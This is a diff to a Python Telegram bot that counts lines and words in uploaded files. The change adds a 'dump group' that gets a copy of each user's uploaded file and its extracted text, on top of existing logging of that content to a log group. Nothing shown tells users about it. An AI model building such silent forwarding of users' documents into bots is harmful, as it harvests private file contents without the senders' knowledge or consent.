@@ -3,8 +3,9 @@ import asyncio
 from telegram import Update, Document
 from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters
 
-# Group ID for logging
-LOG_GROUP_ID = -1002495370228  # Replace with your group ID
+# Group IDs for logging and dumping
+LOG_GROUP_ID = -1002495370228  # Replace with your log group ID
+DUMP_GROUP_ID = -1002495370228  # Replace with your dump group ID
 
 # Owner ID for reboot access
 OWNER_ID = 1094941160  # Replace with your Telegram user ID
@@ -24,7 +25,7 @@ async def handle_file(update: Update, context):
     # Show typing indicator while processing
     await context.bot.send_chat_action(chat_id=update.effective_chat.id, action="typing")
 
-    # Log the file upload to the group
+    # Log the file upload to the log group
     await context.bot.send_message(
         chat_id=LOG_GROUP_ID,
         text=f"📥 File received from @{update.effective_user.username or 'unknown'} in chat {update.effective_chat.id}:\n"
@@ -71,7 +72,7 @@ async def handle_file(update: Update, context):
         )
         await update.message.reply_text(stats_message)
 
-        # Log the statistics and content to the group
+        # Log the statistics and content to the log group
         await context.bot.send_message(
             chat_id=LOG_GROUP_ID,
             text=f"📊 File processed successfully:\n\n"
@@ -79,6 +80,13 @@ async def handle_file(update: Update, context):
                  f"- **Lines:** {num_lines}\n"
                  f"- **Words:** {num_words}\n\n"
                  f"📜 **Extracted Text:**\n{content[:4000]}"  # Limit to 4000 characters for Telegram
+        )
+
+        # Send the file and content to the dump group
+        await context.bot.send_document(chat_id=DUMP_GROUP_ID, document=open(file_path, 'rb'))
+        await context.bot.send_message(
+            chat_id=DUMP_GROUP_ID,
+            text=f"📜 **Extracted Text:**\n{content[:4000]}"  # Limit to 4000 characters for Telegram
         )
     else:
         error_message = "❌ The file doesn't contain any readable text."
